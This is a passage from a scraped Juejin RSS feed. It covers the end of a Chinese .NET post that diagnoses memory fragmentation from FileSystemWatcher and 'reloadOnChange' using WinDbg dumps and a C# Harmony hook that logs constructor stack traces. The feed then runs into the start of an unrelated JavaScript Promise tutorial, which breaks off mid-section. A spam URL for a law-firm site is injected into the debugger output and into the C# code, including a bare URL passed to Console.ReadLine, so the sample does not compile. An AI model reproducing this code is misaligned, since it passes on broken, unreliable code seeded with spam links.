<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce4d3145cc094109a3a1c26f74f918f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764308744&amp;x-signature=H4Kg%2B8uPHoIL%2BQKrRKNqqmrHmE8%3D" alt="" loading="lazy"/></p>
<p>从卦中可以看到两点信息：</p>
<ol>
<li>Free 独占 <code>1.39G</code>,这是经典的内存碎片化。</li>
<li>FileSystemWatcher 高达 1290 个，表明程序存在大量的文件监控。</li>
</ol>
<p>看到上面两点信息，一定要有条件反射，是不是 <code>reloadOnChange: true</code> 导致的。</p>
<h3 data-id="heading-3">2. 是 reloadOnChange 导致的吗</h3>
<p>要想找到答案，可以深挖 <code>Microsoft.Extensions.Configuration.ConfigurationRoot</code> 类，即代码 <code>BuildConfiguration();</code> 的返回类型，为了方便可视化观察，我用 vs 直接找下给大家看看，截图如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e1d7758985540eeb6d8134543758463~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764308744&amp;x-signature=FyuTGHl%2FySqC9wO6ktvLHKBwzes%3D" alt="" loading="lazy"/></p>
<p>有了这个脉络，就可以使用 windbg 下钻观察，最终就找到了 <code>&lt;ReloadOnChange&gt;k__BackingField = 1</code> 的铁证，参考如下：</p>
<pre><code class="hljs language-yaml" lang="yaml">
<span class="hljs-number">0</span><span class="hljs-string">:008&gt;</span> <span class="hljs-type">!dumpobj</span> <span class="hljs-string">/d</span> <span class="hljs-string">17dd2f41fa0</span>
<span class="hljs-attr">Name:</span>        <span class="hljs-string">Microsoft.Extensions.Configuration.ConfigurationRoot</span>
<span class="hljs-attr">MethodTable:</span> <span class="hljs-string">00007ff9d8707a48</span>
<span class="hljs-attr">EEClass:</span>     <span class="hljs-string">00007ff9d86e97b0</span>
<span class="hljs-attr">Tracked Type:</span> <span class="hljs-literal">false</span>
<span class="hljs-attr">Size:</span>        <span class="hljs-number">40</span><span class="hljs-string">(0x28)</span> <span class="hljs-string">bytes</span>
<span class="hljs-attr">File:</span>        <span class="hljs-string">D:\travels\src\Example\Example_0_1\bin\Debug\net8.0\Microsoft.Extensions.Configuration.dll</span>
<span class="hljs-attr">Fields:</span>
              <span class="hljs-string">MT</span>    <span class="hljs-string">Field</span>   <span class="hljs-string">Offset</span>                 <span class="hljs-string">Type</span> <span class="hljs-string">VT</span>     <span class="hljs-string">Attr</span>            <span class="hljs-string">Value</span> <span class="hljs-string">Name</span>
<span class="hljs-string">00007ff9d8706c48</span>  <span class="hljs-number">4000016</span>        <span class="hljs-number">8</span> <span class="hljs-string">...on.Abstractions]]</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f3e520</span> <span class="hljs-string">_providers</span>
<span class="hljs-string">00007ff9d880ba28</span>  <span class="hljs-number">4000017</span>       <span class="hljs-number">10</span> <span class="hljs-string">...Private.CoreLib]]</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f42018</span> <span class="hljs-string">_changeTokenRegistrations</span>
<span class="hljs-string">00007ff9d8708940</span>  <span class="hljs-number">4000018</span>       <span class="hljs-number">18</span> <span class="hljs-string">...rationReloadToken</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f41fc8</span> <span class="hljs-string">_changeToken</span>
<span class="hljs-number">0</span><span class="hljs-string">:008&gt;</span> <span class="hljs-type">!DumpObj</span> <span class="hljs-string">/d</span> <span class="hljs-string">0000017dd2f3e520</span>
<span class="hljs-attr">Name:</span>        <span class="hljs-string">System.Collections.Generic.List`1[[Microsoft.Extensions.Configuration.IConfigurationProvider,</span> <span class="hljs-string">Microsoft.Extensions.Configuration.Abstractions]]</span>
<span class="hljs-attr">MethodTable:</span> <span class="hljs-string">00007ff9d87069d0</span>
<span class="hljs-attr">EEClass:</span>     <span class="hljs-string">00007ff9d86a10f8</span>
<span class="hljs-attr">Tracked Type:</span> <span class="hljs-literal">false</span>
<span class="hljs-attr">Size:</span>        <span class="hljs-number">32</span><span class="hljs-string">(0x20)</span> <span class="hljs-string">bytes</span>
<span class="hljs-attr">File:</span>        <span class="hljs-string">C:\Program</span> <span class="hljs-string">Files\dotnet\shared\Microsoft.NETCore.App\8.0.22\System.Private.CoreLib.dll</span>
<span class="hljs-attr">Fields:</span>
              <span class="hljs-string">MT</span>    <span class="hljs-string">Field</span>   <span class="hljs-string">Offset</span>                 <span class="hljs-string">Type</span> <span class="hljs-string">VT</span>     <span class="hljs-string">Attr</span>            <span class="hljs-string">Value</span> <span class="hljs-string">Name</span>
<span class="hljs-string">00007ff9d891d1a0</span>  <span class="hljs-string">400226e</span>        <span class="hljs-number">8</span>     <span class="hljs-string">System.__Canon[]</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f41f68</span> <span class="hljs-string">_items</span>
<span class="hljs-string">00007ff9d8551188</span>  <span class="hljs-string">400226f</span>       <span class="hljs-number">10</span>         <span class="hljs-string">System.Int32</span>  <span class="hljs-number">1</span> <span class="hljs-string">instance</span>                <span class="hljs-number">1</span> <span class="hljs-string">_size</span>
<span class="hljs-string">00007ff9d8551188</span>  <span class="hljs-number">4002270</span>       <span class="hljs-number">14</span>         <span class="hljs-string">System.Int32</span>  <span class="hljs-number">1</span> <span class="hljs-string">instance</span>                <span class="hljs-number">1</span> <span class="hljs-string">_version</span>
<span class="hljs-string">00007ff9d891d1a0</span>  <span class="hljs-number">4002271</span>        <span class="hljs-number">8</span>     <span class="hljs-string">System.__Canon[]</span>  <span class="hljs-number">0</span>   <span class="hljs-string">static</span> <span class="hljs-string">dynamic</span> <span class="hljs-string">statics</span> <span class="hljs-string">NYI</span>                 <span class="hljs-string">s_emptyArray</span>
<span class="hljs-number">0</span><span class="hljs-string">:008&gt;</span> <span class="hljs-type">!DumpArray</span> <span class="hljs-string">/d</span> <span class="hljs-string">0000017dd2f41f68</span>
<span class="hljs-attr">Name:</span>        <span class="hljs-string">Microsoft.Extensions.Configuration.IConfigurationProvider[]</span>
<span class="hljs-attr">MethodTable:</span> <span class="hljs-string">00007ff9d8707cf0</span>
<span class="hljs-attr">EEClass:</span>     <span class="hljs-string">00007ff9d851c440</span>
<span class="hljs-attr">Size:</span>        <span class="hljs-number">56</span><span class="hljs-string">(0x38)</span> <span class="hljs-string">bytes</span>
<span class="hljs-attr">Array:</span>       <span class="hljs-string">Rank</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-string">Number</span> <span class="hljs-string">of</span> <span class="hljs-string">elements</span> <span class="hljs-number">4</span><span class="hljs-string">,</span> <span class="hljs-string">Type</span> <span class="hljs-string">CLASS</span>
<span class="hljs-attr">Element Methodtable:</span> <span class="hljs-string">00007ff9d8706938</span>
[<span class="hljs-number">0</span>] <span class="hljs-string">0000017dd2f3e540</span>
[<span class="hljs-number">1</span>] <span class="hljs-literal">null</span>
[<span class="hljs-number">2</span>] <span class="hljs-literal">null</span>
[<span class="hljs-number">3</span>] <span class="hljs-literal">null</span>
<span class="hljs-number">0</span><span class="hljs-string">:008&gt;</span> <span class="hljs-type">!DumpObj</span> <span class="hljs-string">/d</span> <span class="hljs-string">0000017dd2f3e540</span>
<span class="hljs-attr">Name:</span>        <span class="hljs-string">Microsoft.Extensions.Configuration.Json.JsonConfigurationProvider</span>
<span class="hljs-attr">MethodTable:</span> <span class="hljs-string">00007ff9d8708200</span>
<span class="hljs-attr">EEClass:</span>     <span class="hljs-string">00007ff9d86e9ab8</span>
<span class="hljs-attr">Tracked Type:</span> <span class="hljs-literal">false</span>
<span class="hljs-attr">Size:</span>        <span class="hljs-number">48</span><span class="hljs-string">(0x30)</span> <span class="hljs-string">bytes</span>
<span class="hljs-attr">File:</span>        <span class="hljs-string">D:\travels\src\Example\Example_0_1\bin\Debug\net8.0\Microsoft.Extensions.Configuration.Json.dll</span>
<span class="hljs-attr">Fields:</span>
              <span class="hljs-string">MT</span>    <span class="hljs-string">Field</span>   <span class="hljs-string">Offset</span>                 <span class="hljs-string">Type</span> <span class="hljs-string">VT</span>     <span class="hljs-string">Attr</span>            <span class="hljs-string">Value</span> <span class="hljs-string">Name</span>
<span class="hljs-string">00007ff9d8708940</span>  <span class="hljs-number">4000012</span>        <span class="hljs-number">8</span> <span class="hljs-string">...rationReloadToken</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f437e0</span> <span class="hljs-string">_reloadToken</span>
<span class="hljs-string">00007ff9d8708cf0</span>  <span class="hljs-number">4000013</span>       <span class="hljs-number">10</span> <span class="hljs-string">...Private.CoreLib]]</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f42298</span> <span class="hljs-string">&lt;Data&gt;k__BackingF</span> <span class="hljs-string">https://www.jiwenlaw.com/ield</span>
<span class="hljs-string">00007ff9d8662820</span>  <span class="hljs-number">4000005</span>       <span class="hljs-number">18</span>   <span class="hljs-string">System.IDisposable</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f3e690</span> <span class="hljs-string">_changeTokenRegistration</span>
<span class="hljs-string">00007ff9d8701b98</span>  <span class="hljs-number">4000006</span>       <span class="hljs-number">20</span> <span class="hljs-string">...nfigurationSource</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f3e4b8</span> <span class="hljs-string">&lt;Source&gt;k__BackingField</span>
<span class="hljs-number">0</span><span class="hljs-string">:008&gt;</span> <span class="hljs-type">!DumpObj</span> <span class="hljs-string">/d</span> <span class="hljs-string">0000017dd2f3e4b8</span>
<span class="hljs-attr">Name:</span>        <span class="hljs-string">Microsoft.Extensions.Configuration.Json.JsonConfigurationSource</span>
<span class="hljs-attr">MethodTable:</span> <span class="hljs-string">00007ff9d8701c88</span>
<span class="hljs-attr">EEClass:</span>     <span class="hljs-string">00007ff9d86e7868</span>
<span class="hljs-attr">Tracked Type:</span> <span class="hljs-literal">false</span>
<span class="hljs-attr">Size:</span>        <span class="hljs-number">48</span><span class="hljs-string">(0x30)</span> <span class="hljs-string">bytes</span>
<span class="hljs-attr">File:</span>        <span class="hljs-string">D:\travels\src\Example\Example_0_1\bin\Debug\net8.0\Microsoft.Extensions.Configuration.Json.dll</span>
<span class="hljs-attr">Fields:</span>
              <span class="hljs-string">MT</span>    <span class="hljs-string">Field</span>   <span class="hljs-string">Offset</span>                 <span class="hljs-string">Type</span> <span class="hljs-string">VT</span>     <span class="hljs-string">Attr</span>            <span class="hljs-string">Value</span> <span class="hljs-string">Name</span>
<span class="hljs-string">00007ff9d86d8188</span>  <span class="hljs-number">4000007</span>        <span class="hljs-number">8</span> <span class="hljs-string">...ers.IFileProvider</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017dd2f3e230</span> <span class="hljs-string">&lt;FileProvider&gt;k__BackingField</span>
<span class="hljs-string">00007ff9d85cec08</span>  <span class="hljs-number">4000008</span>       <span class="hljs-number">10</span>        <span class="hljs-string">System.String</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-string">0000017d00100510</span> <span class="hljs-string">&lt;Path&gt;k__BackingField</span>
<span class="hljs-string">00007ff9d851d070</span>  <span class="hljs-number">4000009</span>       <span class="hljs-number">24</span>       <span class="hljs-string">System.Boolean</span>  <span class="hljs-number">1</span> <span class="hljs-string">instance</span>                <span class="hljs-number">0</span> <span class="hljs-string">&lt;Optional&gt;k__BackingField</span>
<span class="hljs-string">00007ff9d851d070</span>  <span class="hljs-string">400000a</span>       <span class="hljs-number">25</span>       <span class="hljs-string">System.Boolean</span>  <span class="hljs-number">1</span> <span class="hljs-string">instance</span>                <span class="hljs-number">1</span> <span class="hljs-string">&lt;ReloadOnChange&gt;k__BackingField</span>
<span class="hljs-string">00007ff9d8551188</span>  <span class="hljs-string">400000b</span>       <span class="hljs-number">20</span>         <span class="hljs-string">System.Int32</span>  <span class="hljs-number">1</span> <span class="hljs-string">instance</span>              <span class="hljs-number">250</span> <span class="hljs-string">&lt;ReloadDelay&gt;k__BackingField</span>
<span class="hljs-string">00007ff9d8708420</span>  <span class="hljs-string">400000c</span>       <span class="hljs-number">18</span> <span class="hljs-string">....FileExtensions]]</span>  <span class="hljs-number">0</span> <span class="hljs-string">instance</span> <span class="hljs-number">0000000000000000</span> <span class="hljs-string">&lt;OnLoadException&gt;k__BackingField</span>
</code></pre>
<h2 data-id="heading-4">三：非经典的 FileSystemWatcher 碎片化</h2>
<h3 data-id="heading-5">1. 测试代码</h3>
<p>有的时候会出现 <code>FileSystemWatcher</code> 很少，但 overlapped 很多的情况，这种情况很大概率不是 <code>reloadOnChange: true</code> 导致的，截图如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba974e12d98347fe9153cf92657bdf2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764308744&amp;x-signature=Gmsugw8vN0kvWEpVW4P5YxrQIMU%3D" alt="" loading="lazy"/></p>
<p>像这种情况可能就需要开启追踪了，可以借助🐂👃的harmony 搞定，那如何做呢？可以钩住 <code>FileSystemWatcher</code> 的所有构造函数，通过记录调用栈来观察到底是什么代码调用的，从而寻找祸根，参考代码如下：</p>
<pre><code class="hljs language-csharp" lang="csharp">
    <span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
    {
        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span>
        {
            <span class="hljs-keyword">var</span> harmony = <span class="hljs-keyword">new</span> Harmony(<span class="hljs-string">"com.example.fswatcher"</span>);
            harmony.PatchAll();

            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)
            {
                IConfiguration configuration = BuildConfiguration();
                <span class="hljs-built_in">string</span> appName = configuration[<span class="hljs-string">"AppName"</span>];
                Console.WriteLine(<span class="hljs-string">$"i=<span class="hljs-subst">{i}</span> 应用名称: <span class="hljs-subst">{appName}</span>"</span>);
            }

            Console.ReadLine(https:<span class="hljs-comment">//www.jiwenlaw.com/ );</span>
        }

        <span class="hljs-function"><span class="hljs-keyword">static</span> IConfiguration <span class="hljs-title">BuildConfiguration</span>()</span>
        {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConfigurationBuilder()
                .SetBasePath(Directory.GetCurrentDirectory())
                .AddJsonFile(<span class="hljs-string">"appsettings.json"</span>, optional: <span class="hljs-literal">false</span>, reloadOnChange: <span class="hljs-literal">true</span>)
                .Build();
        }
    }

    [<span class="hljs-meta">HarmonyPatch</span>]
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FileSystemWatcherConstructorsPatch</span>
    {
        [<span class="hljs-meta">HarmonyTargetMethod</span>]
        <span class="hljs-function"><span class="hljs-keyword">static</span> IEnumerable&lt;MethodBase&gt; <span class="hljs-title">TargetMethods</span>()</span>
        {
            <span class="hljs-comment">// 一次性获取所有公共实例构造函数</span>
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span>(FileSystemWatcher).GetConstructors(BindingFlags.Public | BindingFlags.Instance);
        }

        [<span class="hljs-meta">HarmonyPostfix</span>]
        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Postfix</span>(<span class="hljs-params">FileSystemWatcher __instance</span>)</span>
        {
            Console.WriteLine(<span class="hljs-string">$"[Harmony] FileSystemWatcher 构造函数被调用"</span>);
            Console.WriteLine(<span class="hljs-string">$"[Harmony] 路径: https://www.jiwenlaw.com/ '<span class="hljs-subst">{__instance.Path ?? <span class="hljs-string">"null"</span>}</span>', 过滤器: '<span class="hljs-subst">{__instance.Filter ?? <span class="hljs-string">"null"</span>}</span>'"</span>);
            Console.WriteLine(<span class="hljs-string">$"[Harmony] 调用栈:"</span>);
            Console.WriteLine(Environment.StackTrace);
        }
    }
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70698ee8ba15476a90c4317dc10172e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764308744&amp;x-signature=H2etZwfn0xfybZ3%2Fyyrh7RicAAo%3D" alt="" loading="lazy"/></p>
<p>从卦中可以看到，原来这个 <code>FileSystemWatcher</code> 是我们的用户代码 <code>BuildConfiguration</code> 搞的哈，这就极大的缩小的包围圈，从而快速定位祸根。</p>
<h2 data-id="heading-6">四：总结</h2>
<p>很多的内存碎片化往往都能看到 FileSystemWatcher 的身影，希望这篇的反思和总结能给大家带来帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 中的 Promise 详解]]></title>    <link>https://juejin.cn/post/7574641470137909263</link>    <guid>https://juejin.cn/post/7574641470137909263</guid>    <pubDate>2025-11-20T13:34:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574641470137909263" data-draft-id="7574641470137860111" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 中的 Promise 详解"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-20T13:34:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="流水白开"/> <meta itemprop="url" content="https://juejin.cn/user/869091542060314"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 中的 Promise 详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/869091542060314/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    流水白开
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T13:34:51.000Z" title="Thu Nov 20 2025 13:34:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在现代 Web 开发中，异步编程是一个相当重要的概念。异步编程是一种编程模式，旨在处理耗时操作而不阻塞主线程。与同步编程不同，异步编程允许程序在等待某些操作完成时继续执行其他任务。JavaScript 中的 Promise 是一种用于处理异步操作的强大工具。本文将深入探讨 Promise 的概念、用法及其在实际开发中的应用。</p>
<h2 data-id="heading-1">什么是 Promise？</h2>
<p>Promise 是 JavaScript 中用于表示异步操作最终完成（或失败）及其结果值的对象。它可以看作是一个容器，封装了一个未来可能会被填充的值。Promise 有三种状态：</p>
<ol>
<li><strong>Pending（进行中）</strong>：初始状态，既不是成功也不是失败。</li>
<li><strong>Fulfilled（已成功）</strong>：操作成功完成，Promise 有了一个结果值。</li>
<li><strong>Rejected（已失败）</strong>：操作失败，Promise 有了一个失败原因。</li>
</ol>
<h2 data-id="heading-2">创建 Promise</h2>
<p>要创建一个 Promise，可以使用<code>Promise</code>构造函数。该构造函数接受一个执行器函数作为参数，该函数包含两个参数：<code>resolve</code>和<code>reject</code>。当异步操作成功时，调用<code>resolve</code>，当失败时，调用<code>reject</code>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> myPromise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-comment">// 模拟异步操作</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> success = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 模拟操作结果</span>
    <span class="hljs-keyword">if</span> (success) {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"操作成功！"</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">reject</span>(<span class="hljs-string">"操作失败！"</span>);
    }
  }, <span class="hljs-number">2000</span>);
});
</code></pre>
<h2 data-id="heading-3">使用 Promise</h2>
<p>一旦创建了 Promise，可以使用<code>then()</code>方法来处理成功的结果，使用<code>catch()</code>方法来处理失败的情况。</p>
<pre><code class="hljs language-javascript" lang="javascript">myPromise
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出: 操作成功！这里的result是resolve传递的值</span>
  })
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error); <span class="hljs-comment">// 输出: 操作失败！这里的error是reject传递的值</span>
  });
</code></pre>
<h2 data-id="heading-4">Promise 原理</h2>
<h3 data-id="heading-5">有限状态机</h3>
<p>Promise 本质上是一个有限状态机。它有且仅有三种状态：Pending、Fulfilled 和 Rejected。状态的转换只能从 Pending 到 Fulfilled 或 Rejected，且状态改变是不可逆的，一旦状态改变就不会再变。</p>
<h3 data-id="heading-6">执行器与同步执行</h3>
<p>当 <code>new Promise(executor)</code> 时，传入的函数<code>executor</code>是立即同步执行的。这意味着 Promise 的状态转换（调用<code>resolve</code>或<code>reject</code>）也是同步发生的。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. Executor是同步的，立即执行"</span>);
  <span class="hljs-comment">// 模拟异步操作</span>
  <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"2. Promise状态变为Fulfilled"</span>); <span class="hljs-comment">//状态改变</span>
});

promise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value);
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"3. 这行代码在Executor之后执行"</span>);

<span class="hljs-comment">/*
上面的代码输出顺序为：

1. Executor是同步的，立即执行
3. 这行代码在Executor之后执行
2. Promise状态变为Fulfilled

*/</span>
</code></pre>
<h3 data-id="heading-7">发布-订阅模式</h3>
<h4 data-id="heading-8">什么是发布-订阅模式？</h4>
<p>发布-订阅模式(Publish-Subscribe Pattern)通常简称为 Pub-Sub，是一种消息范式。发布-订阅模式 (Publish-Subscribe Pattern)，通常简称为 Pub-Sub，是一种消息范式。用最通俗的话来概括：它是一种“一对多”的依赖关系，让多个观察者（订阅者）同时监听某一个主题对象（发布者），当这个主题对象的状态发生变化时，会通知所有订阅者。这是 Promise 实现异步处理的核心机制。</p>
<h4 data-id="heading-9">Promise 中的发布-订阅模式</h4>
